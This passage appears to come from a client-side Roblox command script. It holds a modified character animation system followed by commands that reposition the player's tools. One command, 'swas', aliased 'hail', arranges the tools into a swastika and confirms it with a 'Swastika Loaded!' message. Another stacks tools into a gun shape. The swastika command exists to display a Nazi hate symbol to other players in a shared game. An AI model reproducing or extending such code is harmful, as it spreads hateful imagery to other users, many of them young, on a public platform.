	local AnimationSpeedDampeningObject = script:FindFirstChild("ScaleDampeningPercent")
	local HumanoidHipHeight = 2

	local humanoidSpeed = 0 -- speed most recently sent to us from onRunning()
	local cachedRunningSpeed = 0 -- The most recent speed used to compute blends.  Tiny variations from cachedRunningSpeed will not cause animation updates.
	local cachedLocalDirection = {x=0.0, y=0.0} -- unit 2D object space direction of motion
	local smallButNotZero = 0.0001 -- We want weights to be small but not so small the animation stops
	local runBlendtime = 0.2
	local lastLookVector = Vector3.new(0.0, 0.0, 0.0) -- used to track whether rootPart orientation is changing.
	local lastBlendTime = 0 -- The last time we blended velocities
	local WALK_SPEED = 6.4
	local RUN_SPEED = 12.8

	local EMOTE_TRANSITION_TIME = 0.1

	local currentAnim = ""
	local currentAnimInstance = nil
	local currentAnimTrack = nil
	local currentAnimKeyframeHandler = nil
	local currentAnimSpeed = 1.0

	local PreloadedAnims = {}

	local animTable = {}
	local animNames = { 
		idle = 	{
			{ id = "http://www.roblox.com/asset/?id=12521158637", weight = 9 },
			{ id = "http://www.roblox.com/asset/?id=12521162526", weight = 1 },
		},
		walk = 	{
			{ id = "http://www.roblox.com/asset/?id=12518152696", weight = 10 }
		},
		run = 	{
			{ id = "http://www.roblox.com/asset/?id=12518152696", weight = 10 } 
		},
		jump = 	{
			{ id = "http://www.roblox.com/asset/?id=12520880485", weight = 10 }
		},
		fall = 	{
			{ id = "http://www.roblox.com/asset/?id=12520972571", weight = 10 }
		},
		climb = {
			{ id = "http://www.roblox.com/asset/?id=12520982150", weight = 10 }
		},
		sit = 	{
			{ id = "http://www.roblox.com/asset/?id=12520993168", weight = 10 }
		},
		toolnone = {
			{ id = "http://www.roblox.com/asset/?id=12520996634", weight = 10 }
		},
		toolslash = {
			{ id = "http://www.roblox.com/asset/?id=12520999032", weight = 10 }
		},
		toollunge = {
			{ id = "http://www.roblox.com/asset/?id=12521002003", weight = 10 }
		},
		wave = {
			{ id = "http://www.roblox.com/asset/?id=12521004586", weight = 10 }
		},
		point = {
			{ id = "http://www.roblox.com/asset/?id=12521007694", weight = 10 }
		},
		dance = {
			{ id = "http://www.roblox.com/asset/?id=12521009666", weight = 10 },
			{ id = "http://www.roblox.com/asset/?id=12521151637", weight = 10 },
			{ id = "http://www.roblox.com/asset/?id=12521015053", weight = 10 }
		},
		dance2 = {
			{ id = "http://www.roblox.com/asset/?id=12521169800", weight = 10 },
			{ id = "http://www.roblox.com/asset/?id=12521173533", weight = 10 },
			{ id = "http://www.roblox.com/asset/?id=12521027874", weight = 10 }
		},
		dance3 = {
			{ id = "http://www.roblox.com/asset/?id=12521178362", weight = 10 },
			{ id = "http://www.roblox.com/asset/?id=12521181508", weight = 10 },
			{ id = "http://www.roblox.com/asset/?id=12521184133", weight = 10 }
		},
		laugh = {
			{ id = "http://www.roblox.com/asset/?id=12521018724", weight = 10 }
		},
		cheer = {
			{ id = "http://www.roblox.com/asset/?id=12521021991", weight = 10 }
		},
	}


	local strafingLocomotionMap = {}
	local fallbackLocomotionMap = {}
	local locomotionMap = strafingLocomotionMap
	-- Existance in this list signifies that it is an emote, the value indicates if it is a looping emote
	local emoteNames = { wave = false, point = false, dance = true, dance2 = true, dance3 = true, laugh = false, cheer = false}

	math.randomseed(tick())

	function findExistingAnimationInSet(set, anim)
		if set == nil or anim == nil then
			return 0
		end

		for idx = 1, set.count, 1 do
			if set[idx].anim.AnimationId == anim.AnimationId then
				return idx
			end
		end

		return 0
	end

	function configureAnimationSet(name, fileList)
		if (animTable[name] ~= nil) then
			for _, connection in pairs(animTable[name].connections) do
				connection:disconnect()
			end
		end
		animTable[name] = {}
		animTable[name].count = 0
		animTable[name].totalWeight = 0
		animTable[name].connections = {}

		-- uncomment this section to allow players to load with their
		-- own (non-classic) animations
        --[[
        local config = script:FindFirstChild(name)
        if (config ~= nil) then
            table.insert(animTable[name].connections, config.ChildAdded:connect(function(child) configureAnimationSet(name, fileList) end))
            table.insert(animTable[name].connections, config.ChildRemoved:connect(function(child) configureAnimationSet(name, fileList) end))

            local idx = 0

            for _, childPart in pairs(config:GetChildren()) do
                if (childPart:IsA("Animation")) then
                    local newWeight = 1
                    local weightObject = childPart:FindFirstChild("Weight")
                    if (weightObject ~= nil) then
                        newWeight = weightObject.Value
                    end
                    animTable[name].count = animTable[name].count + 1
                    idx = animTable[name].count
                    animTable[name][idx] = {}
                    animTable[name][idx].anim = childPart
                    animTable[name][idx].weight = newWeight
                    animTable[name].totalWeight = animTable[name].totalWeight + animTable[name][idx].weight
                    table.insert(animTable[name].connections, childPart.Changed:connect(function(property) configureAnimationSet(name, fileList) end))
                    table.insert(animTable[name].connections, childPart.ChildAdded:connect(function(property) configureAnimationSet(name, fileList) end))
                    table.insert(animTable[name].connections, childPart.ChildRemoved:connect(function(property) configureAnimationSet(name, fileList) end))
                    local lv = childPart:GetAttribute("LinearVelocity")
                    if lv then
                        strafingLocomotionMap[name] = {lv=lv, speed = lv.Magnitude}
                    end
                    if name == "run" or name == "walk" then

                        if lv then
                            fallbackLocomotionMap[name] = strafingLocomotionMap[name]
                        else
                            local speed = name == "run" and RUN_SPEED or WALK_SPEED
                            fallbackLocomotionMap[name] = {lv=Vector2.new(0.0, speed), speed = speed}
                            locomotionMap = fallbackLocomotionMap
                            -- If you don't have a linear velocity with your run or walk, you can't blend/strafe
                            --warn("Strafe blending disabled. No linear velocity information for "..'"'.."walk"..'"'.." and "..'"'.."run"..'"'..".")
                        end

                    end
                end
            end
        end
        ]]

		-- if you uncomment the above section, comment out this "if"-block
		if name == "run" or name == "walk" then
			local speed = name == "run" and RUN_SPEED or WALK_SPEED
			fallbackLocomotionMap[name] = {lv=Vector2.new(0.0, speed), speed = speed}
			locomotionMap = fallbackLocomotionMap
			-- If you don't have a linear velocity with your run or walk, you can't blend/strafe
			--warn("Strafe blending disabled. No linear velocity information for "..'"'.."walk"..'"'.." and "..'"'.."run"..'"'..".")
		end


		-- fallback to defaults
		if (animTable[name].count <= 0) then
			for idx, anim in pairs(fileList) do
				animTable[name][idx] = {}
				animTable[name][idx].anim = Instance.new("Animation")
				animTable[name][idx].anim.Name = name
				animTable[name][idx].anim.AnimationId = anim.id
				animTable[name][idx].weight = anim.weight
				animTable[name].count = animTable[name].count + 1
				animTable[name].totalWeight = animTable[name].totalWeight + anim.weight
			end
		end

		-- preload anims
		for i, animType in pairs(animTable) do
			for idx = 1, animType.count, 1 do
				if PreloadedAnims[animType[idx].anim.AnimationId] == nil then
					Humanoid:LoadAnimation(animType[idx].anim)
					PreloadedAnims[animType[idx].anim.AnimationId] = true
				end
			end
		end
	end

	-- Setup animation objects
	function scriptChildModified(child)
		local fileList = animNames[child.Name]
		if (fileList ~= nil) then
			configureAnimationSet(child.Name, fileList)
		else
			if child:isA("StringValue") then
				animNames[child.Name] = {}
				configureAnimationSet(child.Name, animNames[child.Name])
			end
		end	
	end

	script.ChildAdded:connect(scriptChildModified)
	script.ChildRemoved:connect(scriptChildModified)

	-- Clear any existing animation tracks
	-- Fixes issue with characters that are moved in and out of the Workspace accumulating tracks
	local animator = if Humanoid then Humanoid:FindFirstChildOfClass("Animator") else nil
	if animator then
		local animTracks = animator:GetPlayingAnimationTracks()
		for i,track in ipairs(animTracks) do
			track:Stop(0)
			track:Destroy()
		end
	end

	for name, fileList in pairs(animNames) do
		configureAnimationSet(name, fileList)
	end
	for _,child in script:GetChildren() do
		if child:isA("StringValue") and not animNames[child.name] then
			animNames[child.Name] = {}
			configureAnimationSet(child.Name, animNames[child.Name])
		end
	end

	-- ANIMATION

	-- declarations
	local toolAnim = "None"
	local toolAnimTime = 0

	local jumpAnimTime = 0
	local jumpAnimDuration = 0.31

	local toolTransitionTime = 0.1
	local fallTransitionTime = 0.2

	local currentlyPlayingEmote = false

	-- functions

	function stopAllAnimations()
		local oldAnim = currentAnim

		-- return to idle if finishing an emote
		if (emoteNames[oldAnim] ~= nil and emoteNames[oldAnim] == false) then
			oldAnim = "idle"
		end

		if currentlyPlayingEmote then
			oldAnim = "idle"
			currentlyPlayingEmote = false
		end

		currentAnim = ""
		currentAnimInstance = nil
		if (currentAnimKeyframeHandler ~= nil) then
			currentAnimKeyframeHandler:disconnect()
		end

		if (currentAnimTrack ~= nil) then
			currentAnimTrack:Stop()
			currentAnimTrack:Destroy()
			currentAnimTrack = nil
		end

		for _,v in pairs(locomotionMap) do
			if v.track then
				v.track:Stop()
				v.track:Destroy()
				v.track = nil
			end
		end

		return oldAnim
	end

	function getHeightScale()
		if Humanoid then
			if not Humanoid.AutomaticScalingEnabled then
				return 1
			end

			local scale = Humanoid.HipHeight / HumanoidHipHeight
			if AnimationSpeedDampeningObject == nil then
				AnimationSpeedDampeningObject = script:FindFirstChild("ScaleDampeningPercent")
			end
			if AnimationSpeedDampeningObject ~= nil then
				scale = 1 + (Humanoid.HipHeight - HumanoidHipHeight) * AnimationSpeedDampeningObject.Value / HumanoidHipHeight
			end
			return scale
		end
		return 1
	end


	local function signedAngle(a, b)
		return -math.atan2(a.x * b.y - a.y * b.x, a.x * b.x + a.y * b.y)
	end

	local angleWeight = 2.0
	local function get2DWeight(px, p1, p2, sx, s1, s2)
		local avgLength = 0.5 * (s1 + s2)

		local p_1 = {x = (sx - s1)/avgLength, y = (angleWeight * signedAngle(p1, px))}
		local p12 = {x = (s2 - s1)/avgLength, y = (angleWeight * signedAngle(p1, p2))}	
		local denom = smallButNotZero + (p12.x*p12.x + p12.y*p12.y)
		local numer = p_1.x * p12.x + p_1.y * p12.y
		local r = math.clamp(1.0 - numer/denom, 0.0, 1.0)
		return r
	end

	local function blend2D(targetVelo, targetSpeed)
		local h = {}
		local sum = 0.0
		for n,v1 in pairs(locomotionMap) do
			if targetVelo.x * v1.lv.x < 0.0 or targetVelo.y * v1.lv.y < 0 then
				-- Require same quadrant as target
				h[n] = 0.0
				continue
			end
			h[n] = math.huge
			for j,v2 in pairs(locomotionMap) do
				if targetVelo.x * v2.lv.x < 0.0 or targetVelo.y * v2.lv.y < 0 then
					-- Require same quadrant as target
					continue
				end
				h[n] = math.min(h[n], get2DWeight(targetVelo, v1.lv, v2.lv, targetSpeed, v1.speed, v2.speed))
			end
			sum += h[n]
		end

		--truncates below 10% contribution
		local sum2 = 0.0
		local weightedVeloX = 0
		local weightedVeloY = 0
		for n,v in pairs(locomotionMap) do

			if (h[n] / sum > 0.1) then
				sum2 += h[n]
				weightedVeloX += h[n] * v.lv.x
				weightedVeloY += h[n] * v.lv.y
			else
				h[n] = 0.0
			end
		end
		local animSpeed
		local weightedSpeedSquared = weightedVeloX * weightedVeloX + weightedVeloY * weightedVeloY
		if weightedSpeedSquared > smallButNotZero then
			animSpeed = math.sqrt(targetSpeed * targetSpeed / weightedSpeedSquared)
		else
			animSpeed = 0
		end

		animSpeed = animSpeed / getHeightScale()
		local groupTimePosition = 0
		for n,v in pairs(locomotionMap) do
			if v.track.IsPlaying then
				groupTimePosition = v.track.TimePosition
				break
			end
		end
		for n,v in pairs(locomotionMap) do
			-- if not loco
			if h[n] > 0.0 then
				if not v.track.IsPlaying then 
					v.track:Play(runBlendtime)
					v.track.TimePosition = groupTimePosition
				end

				local weight = math.max(smallButNotZero, h[n] / sum2)
				v.track:AdjustWeight(weight, runBlendtime)
				v.track:AdjustSpeed(animSpeed)
			else
				v.track:Stop(runBlendtime)
			end
		end

	end

	local function getWalkDirection()
		local walkToPoint = Humanoid.WalkToPoint
		local walkToPart = Humanoid.WalkToPart
		if Humanoid.MoveDirection ~= Vector3.zero then
			return Humanoid.MoveDirection
		elseif walkToPart or walkToPoint ~= Vector3.zero then
			local destination
			if walkToPart then
				destination = walkToPart.CFrame:PointToWorldSpace(walkToPoint)
			else
				destination = walkToPoint
			end
			local moveVector = Vector3.zero
			if Humanoid.RootPart then
				moveVector = destination - Humanoid.RootPart.CFrame.Position
				moveVector = Vector3.new(moveVector.x, 0.0, moveVector.z)
				local mag = moveVector.Magnitude
				if mag > 0.01 then
					moveVector /= mag
				end
			end
			return moveVector
		else
			return Humanoid.MoveDirection
		end
	end

	local function updateVelocity(currentTime)

		local tempDir

		if locomotionMap == strafingLocomotionMap then

			local moveDirection = getWalkDirection()

			if not Humanoid.RootPart then
				return
			end

			local cframe = Humanoid.RootPart.CFrame
			if math.abs(cframe.UpVector.Y) < smallButNotZero or pose ~= "Running" or humanoidSpeed < 0.001 then
				-- We are horizontal!  Do something  (turn off locomotion)
				for n,v in pairs(locomotionMap) do
					if v.track then
						v.track:AdjustWeight(smallButNotZero, runBlendtime)
					end
				end
				return
			end
			local lookat = cframe.LookVector
			local direction = Vector3.new(lookat.X, 0.0, lookat.Z)
			direction = direction / direction.Magnitude --sensible upVector means this is non-zero.
			local ly = moveDirection:Dot(direction)
			if ly <= 0.0 and ly > -0.05 then
				ly = smallButNotZero -- break quadrant ties in favor of forward-friendly strafes
			end
			local lx = direction.X*moveDirection.Z - direction.Z*moveDirection.X
			local tempDir = Vector2.new(lx, ly) -- root space moveDirection
			local delta = Vector2.new(tempDir.x-cachedLocalDirection.x, tempDir.y-cachedLocalDirection.y)
			-- Time check serves the purpose of the old keyframeReached sync check, as it syncs anim timePosition
			if delta:Dot(delta) > 0.001 or math.abs(humanoidSpeed - cachedRunningSpeed) > 0.01 or currentTime - lastBlendTime > 1 then
				cachedLocalDirection = tempDir
				cachedRunningSpeed = humanoidSpeed
				lastBlendTime = currentTime
				blend2D(cachedLocalDirection, cachedRunningSpeed)
			end 
		else
			if math.abs(humanoidSpeed - cachedRunningSpeed) > 0.01 or currentTime - lastBlendTime > 1 then
				cachedRunningSpeed = humanoidSpeed
				lastBlendTime = currentTime
				blend2D(Vector2.yAxis, cachedRunningSpeed)
			end
		end
	end

	function setAnimationSpeed(speed)
		if currentAnim ~= "walk" then
			if speed ~= currentAnimSpeed then
				currentAnimSpeed = speed
				currentAnimTrack:AdjustSpeed(currentAnimSpeed)
			end
		end
	end

	function keyFrameReachedFunc(frameName)
		if (frameName == "End") then
			local repeatAnim = currentAnim
			-- return to idle if finishing an emote
			if (emoteNames[repeatAnim] ~= nil and emoteNames[repeatAnim] == false) then
				repeatAnim = "idle"
			end

			if currentlyPlayingEmote then
				if currentAnimTrack.Looped then
					-- Allow the emote to loop
					return
				end

				repeatAnim = "idle"
				currentlyPlayingEmote = false
			end

			local animSpeed = currentAnimSpeed
			playAnimation(repeatAnim, 0.15, Humanoid)
			setAnimationSpeed(animSpeed)
		end
	end

	function rollAnimation(animName)
		local roll = math.random(1, animTable[animName].totalWeight)
		local origRoll = roll
		local idx = 1
		while (roll > animTable[animName][idx].weight) do
			roll = roll - animTable[animName][idx].weight
			idx = idx + 1
		end
		return idx
	end

	local maxVeloX, minVeloX, maxVeloY, minVeloY

	local function destroyRunAnimations()
		for _,v in pairs(strafingLocomotionMap) do
			if v.track then
				v.track:Stop()
				v.track:Destroy()
				v.track = nil
			end
		end
		for _,v in pairs(fallbackLocomotionMap) do
			if v.track then
				v.track:Stop()
				v.track:Destroy()
				v.track = nil
			end
		end
		cachedRunningSpeed = 0
	end

	local function resetVelocityBounds(velo)
		minVeloX = 0
		maxVeloX = 0
		minVeloY = 0
		maxVeloY = 0
	end

	local function updateVelocityBounds(velo)
		if velo then 
			if velo.x > maxVeloX then maxVeloX = velo.x end
			if velo.y > maxVeloY then maxVeloY = velo.y end
			if velo.x < minVeloX then minVeloX = velo.x end
			if velo.y < minVeloY then minVeloY = velo.y end
		end
	end

	local function checkVelocityBounds(velo)
		if maxVeloX == 0 or minVeloX == 0 or maxVeloY == 0 or minVeloY == 0 then
			if locomotionMap == strafingLocomotionMap then
				warn("Strafe blending disabled.  Not all quadrants of motion represented.")
			end
			locomotionMap = fallbackLocomotionMap
		else
			locomotionMap = strafingLocomotionMap
		end
	end

	local function setupWalkAnimation(anim, animName, transitionTime, humanoid)
		resetVelocityBounds()
		-- check to see if we need to blend a walk/run animation
		for n,v in pairs(locomotionMap) do
			v.track = humanoid:LoadAnimation(animTable[n][1].anim)
			v.track.Priority = Enum.AnimationPriority.Core
			updateVelocityBounds(v.lv)
		end
		checkVelocityBounds()
	end

	local function switchToAnim(anim, animName, transitionTime, humanoid)
		-- switch animation		
		if (anim ~= currentAnimInstance) then

			if (currentAnimTrack ~= nil) then
				currentAnimTrack:Stop(transitionTime)
				currentAnimTrack:Destroy()
			end
			if (currentAnimKeyframeHandler ~= nil) then
				currentAnimKeyframeHandler:disconnect()
			end


			currentAnimSpeed = 1.0

			currentAnim = animName
			currentAnimInstance = anim	-- nil in the case of locomotion

			if animName == "walk" then
				setupWalkAnimation(anim, animName, transitionTime, humanoid)
			else
				destroyRunAnimations()
				-- load it to the humanoid; get AnimationTrack
				currentAnimTrack = humanoid:LoadAnimation(anim)
				currentAnimTrack.Priority = Enum.AnimationPriority.Core

				currentAnimTrack:Play(transitionTime)	

				-- set up keyframe name triggers
				currentAnimKeyframeHandler = currentAnimTrack.KeyframeReached:connect(keyFrameReachedFunc)
			end
		end
	end

	function playAnimation(animName, transitionTime, humanoid)
		local idx = rollAnimation(animName)
		local anim = animTable[animName][idx].anim

		switchToAnim(anim, animName, transitionTime, humanoid)
		currentlyPlayingEmote = false
	end

	function playEmote(emoteAnim, transitionTime, humanoid)
		switchToAnim(emoteAnim, emoteAnim.Name, transitionTime, humanoid)
		currentlyPlayingEmote = true
	end

	-------------------------------------------------------------------------------------------
	-------------------------------------------------------------------------------------------

	local toolAnimName = ""
	local toolAnimTrack = nil
	local toolAnimInstance = nil
	local currentToolAnimKeyframeHandler = nil

	function toolKeyFrameReachedFunc(frameName)
		if (frameName == "End") then
			playToolAnimation(toolAnimName, 0.0, Humanoid)
		end
	end


	function playToolAnimation(animName, transitionTime, humanoid, priority)
		local idx = rollAnimation(animName)
		local anim = animTable[animName][idx].anim

		if (toolAnimInstance ~= anim) then

			if (toolAnimTrack ~= nil) then
				toolAnimTrack:Stop()
				toolAnimTrack:Destroy()
				transitionTime = 0
			end

			-- load it to the humanoid; get AnimationTrack
			toolAnimTrack = humanoid:LoadAnimation(anim)
			if priority then
				toolAnimTrack.Priority = priority
			end

			-- play the animation
			toolAnimTrack:Play(transitionTime)
			toolAnimName = animName
			toolAnimInstance = anim

			currentToolAnimKeyframeHandler = toolAnimTrack.KeyframeReached:connect(toolKeyFrameReachedFunc)
		end
	end

	function stopToolAnimations()
		local oldAnim = toolAnimName

		if (currentToolAnimKeyframeHandler ~= nil) then
			currentToolAnimKeyframeHandler:disconnect()
		end

		toolAnimName = ""
		toolAnimInstance = nil
		if (toolAnimTrack ~= nil) then
			toolAnimTrack:Stop()
			toolAnimTrack:Destroy()
			toolAnimTrack = nil
		end

		return oldAnim
	end

	-------------------------------------------------------------------------------------------
	-------------------------------------------------------------------------------------------
	-- STATE CHANGE HANDLERS

	function onRunning(speed)
		local movedDuringEmote = currentlyPlayingEmote and Humanoid.MoveDirection == Vector3.new(0, 0, 0)
		local speedThreshold = movedDuringEmote and Humanoid.WalkSpeed or 0.75
		humanoidSpeed = speed
		if speed > speedThreshold then
			playAnimation("walk", 0.2, Humanoid)
			if pose ~= "Running" then
				pose = "Running"
				updateVelocity(0) -- Force velocity update in response to state change
			end
		else
			if emoteNames[currentAnim] == nil and not currentlyPlayingEmote then
				playAnimation("idle", 0.2, Humanoid)
				pose = "Standing"
			end
		end



	end

	function onDied()
		pose = "Dead"
	end

	function onJumping()
		playAnimation("jump", 0.1, Humanoid)
		jumpAnimTime = jumpAnimDuration
		pose = "Jumping"
	end

	function onClimbing(speed)
		local scale = 5.0
		playAnimation("climb", 0.1, Humanoid)
		setAnimationSpeed(speed / scale)
		pose = "Climbing"
	end

	function onGettingUp()
		pose = "GettingUp"
	end

	function onFreeFall()
		if (jumpAnimTime <= 0) then
			playAnimation("fall", fallTransitionTime, Humanoid)
		end
		pose = "FreeFall"
	end

	function onFallingDown()
		pose = "FallingDown"
	end

	function onSeated()
		pose = "Seated"
	end

	function onPlatformStanding()
		pose = "PlatformStanding"
	end

	-------------------------------------------------------------------------------------------
	-------------------------------------------------------------------------------------------

	function onSwimming(speed)
		if speed > 0 then
			pose = "Running"
		else
			pose = "Standing"
		end
	end

	function animateTool()
		if (toolAnim == "None") then
			playToolAnimation("toolnone", toolTransitionTime, Humanoid, Enum.AnimationPriority.Idle)
			return
		end

		if (toolAnim == "Slash") then
			playToolAnimation("toolslash", 0, Humanoid, Enum.AnimationPriority.Action)
			return
		end

		if (toolAnim == "Lunge") then
			playToolAnimation("toollunge", 0, Humanoid, Enum.AnimationPriority.Action)
			return
		end
	end

	function getToolAnim(tool)
		for _, c in ipairs(tool:GetChildren()) do
			if c.Name == "toolanim" and c.className == "StringValue" then
				return c
			end
		end
		return nil
	end

	local lastTick = 0

	function stepAnimate(currentTime)
		local amplitude = 1
		local frequency = 1
		local deltaTime = currentTime - lastTick
		lastTick = currentTime

		local climbFudge = 0
		local setAngles = false

		if (jumpAnimTime > 0) then
			jumpAnimTime = jumpAnimTime - deltaTime
		end

		if (pose == "FreeFall" and jumpAnimTime <= 0) then
			playAnimation("fall", fallTransitionTime, Humanoid)
		elseif (pose == "Seated") then
			playAnimation("sit", 0.5, Humanoid)
			return
		elseif (pose == "Running") then
			playAnimation("walk", 0.2, Humanoid)
			updateVelocity(currentTime)
		elseif (pose == "Dead" or pose == "GettingUp" or pose == "FallingDown" or pose == "Seated" or pose == "PlatformStanding") then
			stopAllAnimations()
			amplitude = 0.1
			frequency = 1
			setAngles = true
		end

		-- Tool Animation handling
		local tool = Character:FindFirstChildOfClass("Tool")
		if tool and tool:FindFirstChild("Handle") then
			local animStringValueObject = getToolAnim(tool)

			if animStringValueObject then
				toolAnim = animStringValueObject.Value
				-- message recieved, delete StringValue
				animStringValueObject.Parent = nil
				toolAnimTime = currentTime + .3
			end

			if currentTime > toolAnimTime then
				toolAnimTime = 0
				toolAnim = "None"
			end

			animateTool()
		else
			stopToolAnimations()
			toolAnim = "None"
			toolAnimInstance = nil
			toolAnimTime = 0
		end
	end


	-- connect events
	Humanoid.Died:connect(onDied)
	Humanoid.Running:connect(onRunning)
	Humanoid.Jumping:connect(onJumping)
	Humanoid.Climbing:connect(onClimbing)
	Humanoid.GettingUp:connect(onGettingUp)
	Humanoid.FreeFalling:connect(onFreeFall)
	Humanoid.FallingDown:connect(onFallingDown)
	Humanoid.Seated:connect(onSeated)
	Humanoid.PlatformStanding:connect(onPlatformStanding)
	Humanoid.Swimming:connect(onSwimming)

	-- setup emote chat hook
	game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
		local emote = ""
		if (string.sub(msg, 1, 3) == "/e ") then
			emote = string.sub(msg, 4)
		elseif (string.sub(msg, 1, 7) == "/emote ") then
			emote = string.sub(msg, 8)
		end

		if (pose == "Standing" and emoteNames[emote] ~= nil) then
			playAnimation(emote, EMOTE_TRANSITION_TIME, Humanoid)
		end
	end)

	-- emote bindable hook
	script:WaitForChild("PlayEmote").OnInvoke = function(emote)
		-- Only play emotes when idling
		if pose ~= "Standing" then
			return
		end

		if emoteNames[emote] ~= nil then
			-- Default emotes
			playAnimation(emote, EMOTE_TRANSITION_TIME, Humanoid)

			return true, currentAnimTrack
		elseif typeof(emote) == "Instance" and emote:IsA("Animation") then
			-- Non-default emotes
			playEmote(emote, EMOTE_TRANSITION_TIME, Humanoid)

			return true, currentAnimTrack
		end

		-- Return false to indicate that the emote could not be played
		return false
	end

	if Character.Parent ~= nil then
		-- initialize to idle
		playAnimation("idle", 0.1, Humanoid)
		pose = "Standing"
	end

	-- loop to handle timed state transitions and tool animations
	task.spawn(function()
		while Character.Parent ~= nil do
			local _, currentGameTime = wait(0.1)
			stepAnimate(currentGameTime)
		end
	end)
end

RunCustomAnimation(plr.Character)

plr.CharacterAdded:Connect(function(Char)
	RunCustomAnimation(Char)
end)
end)

AddCommand("lowhold", {}, "makes you low holding a tool", {1}, function()
--[[local plr = game.Players.LocalPlayer
local bp = plr.Backpack

local char = plr.Character
local boombox = char and char:FindFirstChild("BoomBox") or bp:FindFirstChild("BoomBox")

if not boombox then return end

boombox.Parent = char

for _, x in next, char.Humanoid:GetPlayingAnimationTracks() do
    if x.Name == "ToolNoneAnim" then
        x:Stop()
    end
end

char.Animate.toolnone.ToolNoneAnim.AnimationId = ""

boombox.Grip = CFrame.new(0, .70, 0) * CFrame.Angles(math.rad(90), math.rad(180), math.rad(90))
boombox.Parent = bp
boombox.Parent = char--]]



local plr = game.Players.LocalPlayer
local bp = plr.Backpack

local char = plr.Character

local boombox = filter(GetChildren(LocalPlayer.Backpack), function(i, v)

		if (Sfind(lower(v.Name), "boombox") or FindFirstChildOfClass(v.Handle, "Sound", true)) then
			v.Parent = bp
			v.Parent = char
			for _, x in next, char.Humanoid:GetPlayingAnimationTracks() do
				if x.Name == "ToolNoneAnim" then
					x:Stop()
				end
			end
			char.Animate.toolnone.ToolNoneAnim.AnimationId = ""

			v.Grip = CFrame.new(0, .70, 0) * CFrame.Angles(math.rad(90), math.rad(180), math.rad(90))
			v.Parent = bp
			v.Parent = char
		end
	end)
end)

AddCommand("swas", {"hail"}, "creates a swas with tools", {1}, function()
	local sin = math.sin
	local cos = math.cos
	local rd = math.rad
	local cf = {a=CFrame.Angles,n=CFrame.new}
	local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
	local char = plr.Character
	local UIS = game:GetService("UserInputService")
	local Tools = plr.Backpack:GetChildren()

	Tools[1].Grip = cf.n(-1.5,-5.5,-1.5) * cf.a(rd(0),rd(0),rd(0))
	Tools[1].Parent = char

	Tools[2].Grip = cf.n(1,-5.5,-1.5) * cf.a(rd(0),rd(0),rd(0))
	Tools[2].Parent = char

	Tools[3].Grip = cf.n(6.7,1.5,-1.5) * cf.a(rd(-360),rd(-360),rd(-270))
	Tools[3].Parent = char

	Tools[4].Grip = cf.n(9.2,1.5,-1.5) * cf.a(rd(-360),rd(-360),rd(-270))
	Tools[4].Parent = char

	Tools[5].Grip = cf.n(11.8,1.5,-1.5) * cf.a(rd(-360),rd(-360),rd(-270))
	Tools[5].Parent = char

	Tools[6].Grip = cf.n(3.5,-12.7,-1.5) * cf.a(rd(-0),rd(-0),rd(0))
	Tools[6].Parent = char

	Tools[7].Grip = cf.n(5,-12.7,-1.5) * cf.a(rd(-0),rd(-0),rd(0))
	Tools[7].Parent = char

	Tools[8].Grip = cf.n(11.8,-2.5,-1.5) * cf.a(rd(-360),rd(-360),rd(-270))
	Tools[8].Parent = char

	Tools[9].Grip = cf.n(9.9,-2.5,-1.5) * cf.a(rd(-360),rd(-360),rd(-270))
	Tools[9].Parent = char

	Tools[10].Grip = cf.n(-1.5,-9.2,-1.5) * cf.a(rd(0),rd(0),rd(0))
	Tools[10].Parent = char

	Tools[11].Grip = cf.n(1,-9.2,-1.5) * cf.a(rd(0),rd(0),rd(0))
	Tools[11].Parent = char

	Tools[12].Grip = cf.n(3,-9.2,-1.5) * cf.a(rd(0),rd(0),rd(0))
	Tools[12].Parent = char

	Tools[13].Grip = cf.n(5,-9.2,-1.5) * cf.a(rd(0),rd(0),rd(0))
	Tools[13].Parent = char

	Tools[14].Grip = cf.n(7.5,5.5,-1.5) * cf.a(rd(-360),rd(-360),rd(-270))
	Tools[14].Parent = char

	Tools[15].Grip = cf.n(6,5.5,-1.5) * cf.a(rd(-360),rd(-360),rd(-270))
	Tools[15].Parent = char

	Utils.Notify(Caller, "Swastika", "Loaded!")
end)

AddCommand("gun", {}, "makes your tool a gun", {1}, function()

	local sin = math.sin
	local cos = math.cos
	local rd = math.rad
	local cf = {a=CFrame.Angles,n=CFrame.new}
	local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
	local char = plr.Character
	local UIS = game:GetService("UserInputService")
	local Tools = plr.Backpack:GetChildren()

	Tools[1].Grip = cf.n(0.1,-0.4,0) * cf.a(rd(10),rd(-90),rd(0))
	Tools[1].Parent = char

	Tools[2].Grip = cf.n(-0.9,-0.9,0) * cf.a(rd(10),rd(-90),rd(0))
	Tools[2].Parent = char

	Tools[3].Grip = cf.n(-1.1,-1.1,0) * cf.a(rd(10),rd(-90),rd(0))
	Tools[3].Parent = char

	Tools[4].Grip = cf.n(-1.3,-1.1,0) * cf.a(rd(10),rd(-90),rd(0))
	Tools[4].Parent = char

	Tools[5].Grip = cf.n(-1.5,-1.1,0) * cf.a(rd(10),rd(-90),rd(0))
	Tools[5].Parent = char

	Tools[6].Grip = cf.n(-1.7,-1.1,0) * cf.a(rd(10),rd(-90),rd(0))
	Tools[6].Parent = char

	Tools[7].Grip = cf.n(-1.9,-1.1,0) * cf.a(rd(10),rd(-90),rd(0))
	Tools[7].Parent = char

	Tools[8].Grip = cf.n(-2.1,-1.1,0) * cf.a(rd(10),rd(-90),rd(0))
	Tools[8].Parent = char

	Tools[9].Grip = cf.n(-2.3,-1.1,0) * cf.a(rd(10),rd(-90),rd(0))
	Tools[9].Parent = char

	Tools[10].Grip = cf.n(-2.5,-1.1,0) * cf.a(rd(10),rd(-90),rd(0))
	Tools[10].Parent = char

	Tools[11].Grip = cf.n(-2.7,-1.1,0) * cf.a(rd(10),rd(-90),rd(0))
	Tools[11].Parent = char

	Tools[12].Grip = cf.n(-2.9,-1.1,0) * cf.a(rd(10),rd(-90),rd(0))
	Tools[12].Parent = char

	Tools[13].Grip = cf.n(-3.1,-1.1,0) * cf.a(rd(10),rd(-90),rd(0))
	Tools[13].Parent = char

	Tools[14].Grip = cf.n(-3.3,-1.1,0) * cf.a(rd(10),rd(-90),rd(0))
	Tools[14].Parent = char

	Tools[15].Grip = cf.n(-3.5,-1,0) * cf.a(rd(10),rd(-90),rd(0))
	Tools[15].Parent = char

	Utils.Notify(Caller, "Gun", "Loaded!")
end)

